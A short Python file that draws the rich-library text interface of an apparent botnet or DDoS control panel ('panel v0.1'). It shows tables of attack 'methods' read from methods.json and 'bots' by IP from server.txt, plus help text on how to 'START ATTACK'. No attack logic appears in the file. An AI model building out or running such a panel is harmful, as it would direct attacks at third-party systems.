from rich.console import Console
from rich.table import Table
from rich import print
import json

class design:
    def __init__(self):
        with open("methods.json", "r",encoding='utf-8') as file:
            self.jsonn = json.load(file)
        self.lists = []
        self.lists2 = []
        self.table = Table(title="Methods")
        self.table2 = Table(title="Servers")
        self.console = Console()
    def methods(self):
        self.table.add_column("No.", style="cyan")
        self.table.add_column("Name", style="magenta")
        self.table.add_column("Usage on server", style="green")

        num = 0
        for text in self.jsonn['methods']:
            num=num+1
            self.table.add_row(str(num), text['name'], text['use'])

        self.console.print(self.table)

    def logo(self):
        self.console.print('''[bold cyan]
    __________
    \______   \_____  ___  __  ____
     |       _/\__  \ \  \/ /_/ __  \ 
     |    |   \ / __ \_\   / \  ___/
     |____|_  /(____  / \_/   \___  >
            \/      \/            \/ panel v0.1   ~твоим буду холстом [/bold cyan]
        ''')

    def bots(self):
        self.table2.add_column("No.", style='cyan')
        self.table2.add_column("IP", style='magenta')

        num = 0
        with open("server.txt", "r") as file:
            while True:
                line = file.readline()
                if not line:
                    break
                num=num+1
                self.table2.add_row(str(num), line)
        self.console.print(self.table2)

    def help(self):
        self.console.print('''
        [bold magenta]./bots[/bold magenta] ~ return all bots
        [bold magenta]./methods[/bold magenta] ~ return methods and Usage
        HOW START ATTACK:
        <name of the method that you write in json file> <options that write in json file>''')
